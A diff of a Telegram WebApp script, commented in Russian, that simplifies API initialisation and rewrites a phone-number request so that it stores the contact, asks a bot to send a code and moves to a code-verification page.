@@ -1,42 +1,23 @@
-// Проверка Telegram WebApp API при загрузке страницы
-window.addEventListener('load', function() {
-    showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
+// Функция запроса номера телефона через Telegram WebApp
+function requestPhoneNumber() {
+    showDebugInfo('🔍 Запрашиваем номер телефона...');
     
-    // Ждем загрузки скрипта
-    let attempts = 0;
-    const maxAttempts = 10;
-    
-    const checkTelegramAPI = () => {
-        attempts++;
-        showDebugInfo(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram = ${window.Telegram ? 'ЕСТЬ' : 'НЕТ'}`);
-        
-        if (window.Telegram && window.Telegram.WebApp) {
-            showDebugInfo('✅ Telegram WebApp API доступен!');
-            // Инициализируем WebApp
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-            return;
-        }
-        
-        if (attempts < maxAttempts) {
-            showDebugInfo('⏳ Ждем загрузки Telegram WebApp API...');
-            setTimeout(checkTelegramAPI, 500);
+    // Запрашиваем номер телефона (как в документации)
+    window.Telegram.WebApp.requestContact((contact) => {
+        showDebugInfo('📱 Получен контакт: ' + (contact ? 'ДА' : 'НЕТ'));
+        if (contact && contact.phone_number) {
+            // Сохраняем номер
+            localStorage.setItem('phoneNumber', contact.phone_number);
+            
+            // Отправляем запрос на отправку кода боту
+            sendCodeToBot(contact.phone_number);
+            
+            // Переходим на страницу ввода кода
+            window.location.href = 'code-verification.html';
         } else {
-            showDebugInfo('❌ Telegram WebApp API не загрузился');
+            alert('❌ Не удалось получить номер телефона');
         }
-    };
-    
-    // Начинаем проверку
-    checkTelegramAPI();
-});ml';
-            } else {
-                alert('❌ Не удалось получить номер телефона');
-            }
-        });
-    } else {
-        showDebugInfo('❌ Telegram WebApp API недоступен');
-        alert('❌ Это приложение работает только в Telegram!');
-    }
+    });
 }
 
 // Функция отправки запроса на код боту
@@ -112,34 +93,12 @@ function showDebugInfo(message) {
     }
 }
 
-// Проверка Telegram WebApp API при загрузке страницы
-window.addEventListener('load', function() {
-    showDebugInfo('🔍 Проверяем Telegram WebApp API при загрузке...');
-    
-    // Ждем загрузки скрипта
-    let attempts = 0;
-    const maxAttempts = 10;
-    
-    const checkTelegramAPI = () => {
-        attempts++;
-        showDebugInfo(`🔍 Попытка ${attempts}/${maxAttempts}: window.Telegram = ${window.Telegram ? 'ЕСТЬ' : 'НЕТ'}`);
-        
-        if (window.Telegram && window.Telegram.WebApp) {
-            showDebugInfo('✅ Telegram WebApp API доступен!');
-            // Инициализируем WebApp
-            window.Telegram.WebApp.ready();
-            window.Telegram.WebApp.expand();
-            return;
-        }
-        
-        if (attempts < maxAttempts) {
-            showDebugInfo('⏳ Ждем загрузки Telegram WebApp API...');
-            setTimeout(checkTelegramAPI, 500);
-        } else {
-            showDebugInfo('❌ Telegram WebApp API не загрузился');
-        }
-    };
-    
-    // Начинаем проверку
-    checkTelegramAPI();
-});
+// Инициализация Telegram WebApp (как в документации)
+if (window.Telegram && window.Telegram.WebApp) {
+    showDebugInfo('✅ Telegram WebApp API доступен!');
+    // Инициализируем WebApp сразу
+    window.Telegram.WebApp.ready();
+    window.Telegram.WebApp.expand();
+} else {
+    showDebugInfo('❌ Telegram WebApp API недоступен');
+}
